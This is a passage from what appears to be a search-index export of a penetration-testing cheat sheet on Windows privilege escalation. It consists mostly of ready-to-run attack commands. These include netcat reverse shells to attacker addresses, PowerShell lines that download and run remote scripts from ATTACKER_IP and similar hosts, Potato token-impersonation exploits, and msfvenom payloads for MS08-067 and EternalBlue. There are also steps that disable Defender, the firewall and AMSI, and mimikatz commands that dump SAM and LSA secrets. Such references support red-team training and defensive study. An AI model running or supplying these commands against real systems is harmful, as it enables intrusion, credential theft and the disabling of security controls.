binary via an SMB share. runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\" runas /savecred /user:Administrator \"cmd.exe /k whoami\" Using runas with a provided set of credential. C:\\Windows\\System32\\runas.exe /env /noprofile /user:<username> <password> \"c:\\users\\Public\\nc.exe -nc <attacker-ip> 4444 -e cmd.exe\" $secpasswd = ConvertTo-SecureString \"<password>\" -AsPlainText -Force $mycreds = New-Object System.Management.Automation.PSCredential (\"<user>\", $secpasswd) $computer = \"<hostname>\" [System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\",\"<attacker_ip> 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer) EoP - Abusing Shadow Copies If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation. # List shadow copies using vssadmin (Needs Admnistrator Access) vssadmin list shadows # List shadow copies using diskshadow diskshadow list shadows all # Make a symlink to the shadow copy and access it mklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\ EoP - From local administrator to NT SYSTEM PsExec.exe -i -s cmd.exe EoP - Living Off The Land Binaries and Scripts Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/ The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. A LOLBin/Lib/Script must: Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \"unexpected\" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses Have functionality that would be useful to an APT or red team wmic.exe process call create calc regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll Microsoft.Workflow.Compiler.exe tests.xml results.xml EoP - Impersonation Privileges Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files. Privilege Impact Tool Execution path Remarks SeAssignPrimaryToken Admin 3rd party tool \"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\" Thank you Aur\u00e9lien Chalot for the update. I will try to re-phrase it to something more recipe-like soon. SeBackup Threat Built-in commands Read sensitve files with robocopy /b - May be more interesting if you can read %WINDIR%\\MEMORY.DMP - SeBackupPrivilege (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter. SeCreateToken Admin 3rd party tool Create arbitrary token including local admin rights with NtCreateToken . SeDebug Admin PowerShell Duplicate the lsass.exe token. Script to be found at FuzzySecurity SeLoadDriver Admin 3rd party tool 1. Load buggy kernel driver such as szkg64.sys or capcom.sys 2. Exploit the driver vulnerability Alternatively, the privilege may be used to unload security-related drivers with ftlMC builtin command. i.e.: fltMC sysmondrv 1. The szkg64 vulnerability is listed as CVE-2018-15732 2. The szkg64 exploit code was created by Parvez Anwar SeRestore Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present. 2. Enable the privilege with Enable-SeRestorePrivilege ). 3. Rename utilman.exe to utilman.old 4. Rename cmd.exe to utilman.exe 5. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. SeTakeOwnership Admin Built-in commands 1. takeown.exe /f \"%windir%\\system32\" 2. icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F 3. Rename cmd.exe to utilman.exe 4. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. SeTcb Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified. Restore A Service Account's Privileges This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only. # https://github.com/itm4n/FullPowers c:\\TOOLS>FullPowers [+] Started dummy thread with id 9976 [+] Successfully created scheduled task. [+] Got new token! Privilege count: 7 [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.19041.84] (c) 2019 Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32>whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======= SeAssignPrimaryTokenPrivilege Replace a process level token Enabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeAuditPrivilege Generate security audits Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled c:\\TOOLS>FullPowers -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z Meterpreter getsystem and alternatives meterpreter> getsystem Tokenvator.exe getsystem cmd.exe incognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe psexec -s -i cmd.exe python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc RottenPotato (Token Impersonation) Binary available at : https://github.com/foxglovesec/RottenPotato Binary available at : https://github.com/breenmachine/RottenPotatoNG getuid getprivs use incognito list\\_tokens -u cd c:\\temp\\ execute -Hc -f ./rot.exe impersonate\\_token \"NT AUTHORITY\\SYSTEM\" Invoke-TokenManipulation -ImpersonateUser -Username \"lab\\domainadminuser\" Invoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\SYSTEM\" Get-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\" Juicy Potato (Abusing the golden privileges) If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato Binary available at : https://github.com/ohpe/juicy-potato/releases Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication) powershell whoami /priv Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object Windows 7 Enterprise Windows 8.1 Enterprise Windows 10 Enterprise Windows 10 Professional Windows Server 2008 R2 Enterprise Windows Server 2012 Datacenter Windows Server 2016 Standard Execute JuicyPotato to run a privileged command. powershell JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7} JuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334} JuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\users\\User\\reverse_shell.exe\" Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337 ...... [+] authresult 0 {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK Rogue Potato (Fake OXID Resolver) Binary available at https://github.com/antonioCoco/RoguePotato # Network redirector / port forwarder to run on your remote machine, must use port 135 as src port socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999 # RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. # Use this if you have fw restrictions. RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" # RoguePotato all in one with RogueOxidResolver running locally on port 9999 RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 #RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename RoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode EFSPotato (MS-EFSR EfsRpcOpenFileRaw) Binary available at https://github.com/zcgonvh/EfsPotato # .NET 4.x csc EfsPotato.cs csc /platform:x86 EfsPotato.cs # .NET 2.0/3.5 C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs C:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs EoP - Privileged File Write DiagHub :warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs. The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM. This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the C:\\Windows\\System32 directory. Exploit Create an evil DLL e.g: payload.dll and move it into C:\\Windows\\System32 Build https://github.com/xct/diaghub diaghub.exe c:\\\\ProgramData\\\\ payload.dll The default payload will run C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe Alternative tools: * https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag * https://github.com/decoder-it/diaghub_exploit UsoDLLLoader :warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview. An alternative to the DiagHub DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo) If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of windowscoredeviceinfo.dll into C:\\Windows\\Sytem32\\ and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System . Exploit Build https://github.com/itm4n/UsoDllLoader Select Release config and x64 architecure. Build solution. DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll Loader .\\x64\\Release\\UsoDllLoader.exe. Copy WindowsCoreDeviceInfo.dll to C:\\Windows\\System32\\ Use the loader and wait for the shell or run usoclient StartInteractiveScan and connect to the bind shell on port 1337. WerTrigger Weaponizing for privileged file writes bugs with Windows problem reporting Clone https://github.com/sailay1996/WerTrigger Copy phoneinfo.dll to C:\\Windows\\System32\\ Place Report.wer file and WerTrigger.exe in a same directory. Then, run WerTrigger.exe . Enjoy a shell as NT AUTHORITY\\SYSTEM EoP - Common Vulnerabilities and Exposure MS08-067 (NetAPI) Check the vulnerability with the following nmap script. nmap -Pn -p445\u200a--open\u200a--max-hostgroup 3\u200a--script smb-vuln-ms08-067 <ip_netblock> Metasploit modules to exploit MS08-067 NetAPI . exploit/windows/smb/ms08_067_netapi If you can't use Metasploit and only want a reverse shell. https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode -a x86 --platform windows Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445 Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used) Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX) Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX) Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX) python ms08-067.py 10.0.0.1 6 445 MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7 'KiTrap0D' User Mode to Ring Escalation (MS10-015) https://www.exploit-db.com/exploits/11199 Metasploit : exploit/windows/local/ms10_015_kitrap0d MS11-080 (afd.sys) - Microsoft Windows XP/2003 Python: https://www.exploit-db.com/exploits/18176 Metasploit: exploit/windows/local/ms11_080_afdjoinleaf MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012 printf(\"[#] usage: ms15-051 command \\n\"); printf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\"); # x32 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe # x64 https://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051 use exploit/windows/local/ms15_051_client_copy_image MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) Check if the patch is installed : wmic qfe list | findstr \"3139914\" Powershell: https://www.exploit-db.com/exploits/39719/ https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1 Binary exe : https://github.com/Meatballs1/ms16-032 Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc MS17-010 (Eternal Blue) Check the vulnerability with the following nmap script or crackmapexec: crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010 . nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17\u2013010 <ip_netblock> Metasploit modules to exploit EternalRomance/EternalSynergy/EternalChampion . auxiliary/admin/smb/ms17_010_command MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ exploit/windows/smb/ms17_010_psexec MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution If you can't use Metasploit and only want a reverse shell. git clone https://github.com/helviojunior/MS17-010 # generate a simple reverse shell to use msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o revshell.exe python2 send_and_execute.py 10.0.0.1 revshell.exe CVE-2019-1388 Exploit : https://packetstormsecurity.com/files/14437/hhupd.exe.html Requirement: - Windows 7 - Windows 10 LTSC 10240 Failing on : - LTSC 2019 - 1709 - 1803 Detailed information about the vulnerability : https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege References Windows Internals Book - 02/07/2017 icacls - Docs Microsoft Privilege Escalation Windows - Philip Linghammar Windows elevation of privileges - Guifre Ruiz The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte Basic Linux Privilege Escalation Windows Privilege Escalation Fundamentals TOP\u201310 ways to boost your privileges in Windows systems - hackmag The SYSTEM Challenge Windows Privilege Escalation Guide - absolomb's security blog Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell Pentestlab.blog - WPE-01 - Stored Credentials Pentestlab.blog - WPE-02 - Windows Kernel Pentestlab.blog - WPE-03 - DLL Injection Pentestlab.blog - WPE-04 - Weak Service Permissions Pentestlab.blog - WPE-05 - DLL Hijacking Pentestlab.blog - WPE-06 - Hot Potato Pentestlab.blog - WPE-07 - Group Policy Preferences Pentestlab.blog - WPE-08 - Unquoted Service Path Pentestlab.blog - WPE-09 - Always Install Elevated Pentestlab.blog - WPE-10 - Token Manipulation Pentestlab.blog - WPE-11 - Secondary Logon Handle Pentestlab.blog - WPE-12 - Insecure Registry Permissions Pentestlab.blog - WPE-13 - Intel SYSRET Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @ xpn Living Off The Land Binaries and Scripts (and now also Libraries) Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec Local Privilege Escalation Workshop - Slides.pdf - @sagishahar Abusing Diaghub - xct - March 07, 2019 Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018 Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019 Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows Abusing SeLoadDriverPrivilege for privilege escalation - 14 - JUN - 2018 - OSCAR MALLO Universal Privilege Escalation and Persistence \u2013 Printer - AUGUST 2, 2021)","title":"Windows - Privilege Escalation"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#windows-privilege-escalation","text":"","title":"Windows - Privilege Escalation"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#summary","text":"Tools Windows Version and Configuration User Enumeration Network Enumeration Antivirus & Detections Windows Defender Firewall AppLocker Enumeration Powershell Default Writeable Folders EoP - Looting for passwords SAM and SYSTEM files LAPS Settings HiveNightmare Search for file contents Search for a file with a certain filename Search the registry for key names and passwords Passwords in unattend.xml Wifi passwords Sticky Notes passwords Passwords stored in services Passwords stored in Key Manager Powershell History Powershell Transcript Password in Alternate Data Stream EoP - Processes Enumeration and Tasks EoP - Incorrect permissions in services EoP - Windows Subsystem for Linux (WSL) EoP - Unquoted Service Paths EoP - $PATH Interception EoP - Named Pipes EoP - Kernel Exploitation EoP - AlwaysInstallElevated EoP - Insecure GUI apps EoP - Evaluating Vulnerable Drivers EoP - Printers Universal Printer Bring Your Own Vulnerability EoP - Runas EoP - Abusing Shadow Copies EoP - From local administrator to NT SYSTEM EoP - Living Off The Land Binaries and Scripts EoP - Impersonation Privileges Restore A Service Account's Privileges Meterpreter getsystem and alternatives RottenPotato (Token Impersonation) Juicy Potato (Abusing the golden privileges) Rogue Potato (Fake OXID Resolver) ) EFSPotato (MS-EFSR EfsRpcOpenFileRaw) ) EoP - Privileged File Write DiagHub UsoDLLLoader WerTrigger EoP - Common Vulnerabilities and Exposures MS08-067 (NetAPI) MS10-015 (KiTrap0D) MS11-080 (adf.sys) MS15-051 (Client Copy Image) MS16-032 MS17-010 (Eternal Blue) CVE-2019-1388 EoP - $PATH Interception References","title":"Summary"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#tools","text":"PowerSploit's PowerUp powershell powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester powershell ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems WindowsExploits - Windows exploits, mostly precompiled. Not being updated. WindowsEnum - A Powershell Privilege Escalation Enumeration Script. Seatbelt - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. powershell Seatbelt.exe -group=all -full Seatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\" Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\" Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind JAWS - Just Another Windows (Enum) Script powershell powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt winPEAS - Windows Privilege Escalation Awesome Script Windows Exploit Suggester - Next Generation (WES-NG) powershell # First obtain systeminfo systeminfo systeminfo > systeminfo.txt # Then feed it to wesng python3 wes.py --update-wes python3 wes.py --update python3 wes.py systeminfo.txt PrivescCheck - Privilege Escalation Enumeration Script for Windows powershell C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\" C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\" C:\\Temp\\>powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\"","title":"Tools"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#windows-version-and-configuration","text":"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" Extract patchs and updates wmic qfe Architecture wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% List all env variables set Get-ChildItem Env: | ft Key,Value List all drives wmic logicaldisk get caption || fsutil fsinfo drives wmic logicaldisk get caption,description,providername Get-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root","title":"Windows Version and Configuration"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#user-enumeration","text":"Get current username echo %USERNAME% || whoami $env:username List user privilege whoami /priv whoami /groups List all users net user whoami /all Get-LocalUser | ft Name,Enabled,LastLogon Get-ChildItem C:\\Users -Force | select Name List logon requirements; useable for bruteforcing ```powershell$env:usernadsc net accounts Get details about a user (i.e. administrator, admin, current user) ```powershell net user administrator net user admin net user %USERNAME% List all local groups net localgroup Get-LocalGroup | ft Name Get details about a group (i.e. administrators) net localgroup administrators Get-LocalGroupMember Administrators | ft Name, PrincipalSource Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource Get Domain Controllers nltest /DCLIST:DomainName nltest /DCNAME:DomainName nltest /DSGETDC:DomainName","title":"User Enumeration"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#network-enumeration","text":"List all network interfaces, IP, and DNS. ipconfig /all Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address Get-DnsClientServerAddress -AddressFamily IPv4 | ft List current routing table route print Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex List the ARP table arp -A Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State List all current connections netstat -ano List all network shares net share powershell Find-DomainShare -ComputerDomain domain.local SNMP Configuration reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse","title":"Network Enumeration"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#antivirus-detections","text":"Enumerate antivirus on a box with WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName","title":"Antivirus &amp; Detections"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#windows-defender","text":"# check status of Defender PS C:\\> Get-MpComputerStatus # disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\> Set-MpPreference -DisableIOAVProtection $true # disable AMSI (set to 0 to enable) PS C:\\> Set-MpPreference -DisableScriptScanning 1 # exclude a folder PS C:\\> Add-MpPreference -ExclusionPath \"C:\\Temp\" PS C:\\> Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\" PS C:\\> Set-MpPreference -ExclusionProcess \"word.exe\", \"vmwp.exe\" # remove signatures (if Internet connection is present, they will be downloaded again): PS > & \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" -RemoveDefinitions -All PS > & \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All","title":"Windows Defender"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#firewall","text":"List firewall state and current configuration netsh advfirewall firewall dump # or netsh firewall show state netsh firewall show config List firewall's blocked ports $f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq \"0\"} | select name,applicationname,localports Disable firewall # Disable Firewall on Windows 7 via cmd reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable Firewall on Windows 7 via Powershell powershell.exe -ExecutionPolicy Bypass -command 'Set-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\" -Name \"fDenyTSConnections\" \u2013Value'` # Disable Firewall on any windows via cmd netsh firewall set opmode disable netsh Advfirewall set allprofiles state off","title":"Firewall"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#applocker-enumeration","text":"With the GPO HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script). List AppLocker rules powershell PowerView PS C:\\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections AppLocker Bypass By default, C:\\Windows is not blocked, and C:\\Windows\\Tasks is writtable by any users https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md","title":"AppLocker Enumeration"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell","text":"Default powershell locations in a Windows system. C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell","title":"Powershell"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#powershell-constrained-mode","text":"Check if we are in a constrained mode: $ExecutionContext.SessionState.LanguageMode bypass-clm - PowerShell Constrained Language Mode Bypass PowerShdll - Powershell with no Powershell.exe via DLL's : rundll32.exe C:\\temp\\PowerShdll.dll,main Other bypasses powershell PS > &{ whoami } powershell.exe -v 2 -ep bypass -command \"IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')\"","title":"Powershell Constrained Mode"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#amsi-bypass","text":"Find more AMSI bypass: here PS C:\\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)","title":"AMSI Bypass"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#default-writeable-folders","text":"C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\spool\\printers C:\\Windows\\System32\\spool\\servers C:\\Windows\\tracing C:\\Windows\\Temp C:\\Users\\Public C:\\Windows\\Tasks C:\\Windows\\System32\\tasks C:\\Windows\\SysWOW64\\tasks C:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system C:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system C:\\Windows\\debug\\wia C:\\Windows\\registration\\crmlog C:\\Windows\\System32\\com\\dmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\System32\\fxstmp C:\\Windows\\SysWOW64\\fxstmp","title":"Default Writeable Folders"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#eop-looting-for-passwords","text":"","title":"EoP - Looting for passwords"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#sam-and-system-files","text":"The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM. # Usually %SYSTEMROOT% = C:\\Windows %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Generate a hash file for John using pwdump or samdump2 . pwdump SYSTEM SAM > /root/sam.txt samdump2 SYSTEM SAM -o sam.txt Either crack it with john -format=NT /root/sam.txt , hashcat or use Pass-The-Hash.","title":"SAM and SYSTEM files"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#laps-settings","text":"Extract HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled","title":"LAPS Settings"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#hivenightmare","text":"CVE-2021\u201336934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user Check for the vulnerability using icacls C:\\Windows\\System32> icacls config\\SAM config\\SAM BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) <-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz> token::whoami /full # List shadow copies available mimikatz> misc::shadowcopies # Extract account from SAM databases mimikatz> lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM # Extract secrets from SECURITY mimikatz> lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY","title":"HiveNightmare"},{"location":"Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/#search-for-file-contents","text":"cd C:\\ & findstr /SI /M \"password\" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config findstr /spin \"password\" *.*","title":"Search for file 